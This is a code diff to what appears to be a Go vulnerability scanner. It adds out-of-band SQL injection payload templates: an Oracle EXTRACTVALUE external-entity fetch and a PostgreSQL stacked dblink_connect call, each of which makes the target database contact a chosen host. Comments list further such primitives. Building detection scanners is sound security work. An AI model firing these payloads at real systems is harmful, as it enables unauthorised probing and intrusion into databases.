@@ -8,10 +8,12 @@ package scanner
 //	Oracle      UTL_INADDR.GET_HOST_ADDRESS('<host>'), HTTPURITYPE('http://<host>/').GETCLOB()
 //	MySQL       LOAD_FILE('\\<host>\a') — a UNC path, so only a server on Windows resolves it
 //
-// PostgreSQL has no lookup primitive that does not execute something: COPY ... PROGRAM runs a shell
-// command, so it is deliberately absent, and a PostgreSQL injection is left to the in-band techniques.
-// xp_dirtree lists a directory, UTL_INADDR resolves a name, HTTPURITYPE issues a GET and LOAD_FILE
-// reads a file into a value; none of them writes.
+//	Oracle      EXTRACTVALUE(xmltype('<!DOCTYPE ... SYSTEM "http://<host>/">')) — an external entity fetch
+//	PostgreSQL  ;SELECT dblink_connect('host=<host> ...')-- (stacked; needs the dblink extension)
+//
+// COPY ... PROGRAM is not used: it runs a shell command. xp_dirtree lists a directory, UTL_INADDR
+// resolves a name, HTTPURITYPE and the external entity issue a GET, dblink_connect opens a connection
+// and LOAD_FILE reads a file into a value; none of them writes.
 //
 // # The gate
 //
@@ -70,6 +72,22 @@ func sqlOOBFamilies() []sqlOOBFamily {
 				render: func(host string) string { return "||" + fmt.Sprintf(o.expr, host) }},
 			sqlOOBFamily{dbms: "Oracle", primitive: o.primitive, context: "single-quoted string",
 				render: func(host string) string { return "'||" + fmt.Sprintf(o.expr, host) + "||'" }})
+	}
+	xxe := func(host string) string {
+		return `(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://` +
+			host + `/">%x;]>'),'/l') FROM DUAL)`
+	}
+	out = append(out,
+		sqlOOBFamily{dbms: "Oracle", primitive: "EXTRACTVALUE external entity", context: "numeric",
+			render: func(host string) string { return "||" + xxe(host) }},
+		sqlOOBFamily{dbms: "Oracle", primitive: "EXTRACTVALUE external entity", context: "single-quoted string",
+			render: func(host string) string { return "'||" + xxe(host) + "||'" }})
+	for _, c := range sqlStackedContexts {
+		c := c
+		out = append(out, sqlOOBFamily{dbms: "PostgreSQL", primitive: "dblink_connect", context: c.name,
+			render: func(host string) string {
+				return c.prefix + `;SELECT dblink_connect('host=` + host + ` user=a password=a dbname=a')-- `
+			}})
 	}
 	loadFile := func(host string) string { return `(SELECT LOAD_FILE(CONCAT('\\\\','` + host + `','\\a')))` }
 	out = append(out,
